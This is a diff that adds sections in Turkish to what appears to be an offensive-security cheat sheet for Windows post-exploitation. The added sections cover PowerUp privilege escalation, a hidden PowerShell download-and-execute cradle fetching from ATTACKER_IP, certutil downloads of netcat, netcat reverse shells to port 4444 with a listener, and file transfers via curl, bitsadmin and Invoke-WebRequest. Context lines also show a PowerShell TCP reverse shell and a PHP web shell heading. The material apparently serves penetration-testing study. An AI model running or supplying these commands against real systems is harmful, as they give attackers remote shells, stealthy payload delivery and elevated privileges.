@@ -159,6 +159,100 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100","4444");$strea
 
 ---
 
+## 🛡 PowerUp ile Yetki Yükseltme
+
+PowerUp, hedef Windows makinedeki yerel ayrıcalık yükseltme zafiyetlerini tarar.
+
+```powershell
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+- `Import-Module .\PowerUp.ps1` → PowerUp modülünü yollar ve yükler
+- `Invoke-AllChecks` → tüm checkleri çalıştırır
+- `Invoke-ServiceAbuse`, `Invoke-TokenManipulation` gibi ek fonksiyonlarla daha fazla saldırı yüzeyi keşfedilir
+
+Eğer hedefte PowerUp yoksa, attacker tarafında bir HTTP sunucusu açıp hedefe indirebilirsin:
+
+```powershell
+python -m http.server 8000
+```
+
+Hedefte:
+
+```powershell
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerUp.ps1')"
+```
+
+---
+
+## 🔌 Netcat / nc64.exe
+
+Netcat, ters ve ileri bağlantı kurmak için en yaygın kullanılan araçtır.
+
+- `nc64.exe` → 64-bit Windows Netcat
+- `nc.exe` → 32-bit Windows Netcat
+
+Eğer hedefte netcat yoksa, öncelikle amacıma uygun sürümü karşı tarafa yükle:
+
+```cmd
+certutil -urlcache -f http://ATTACKER_IP/nc64.exe nc64.exe
+```
+
+veya
+
+```cmd
+certutil -urlcache -f http://ATTACKER_IP/nc.exe nc.exe
+```
+
+Ardından reverse shell başlatmak için:
+
+```cmd
+nc64.exe -e cmd.exe ATTACKER_IP 4444
+```
+
+veya
+
+```cmd
+nc.exe -e cmd.exe ATTACKER_IP 4444
+```
+
+Attacker tarafında listener:
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## 📁 Linux'ten Dosya Çekme
+
+### CMD ile
+
+```cmd
+curl http://LINUX_IP/remote-file -o C:\Windows\Temp\downloaded.bin
+```
+
+Eğer `curl` yoksa:
+
+```cmd
+bitsadmin /transfer mydownloadjob /download /priority normal http://LINUX_IP/remote-file C:\Windows\Temp\downloaded.bin
+```
+
+### PowerShell ile
+
+```powershell
+Invoke-WebRequest -Uri http://LINUX_IP/remote-file -OutFile C:\Windows\Temp\downloaded.bin
+```
+
+veya
+
+```powershell
+Invoke-RestMethod -Uri http://LINUX_IP/remote-file -OutFile C:\Windows\Temp\downloaded.bin
+```
+
+---
+
 ## 🌐 PHP Web Shell - Windows Reverse Shell
 
 ### **PHP Web Shell (Query Execution)**
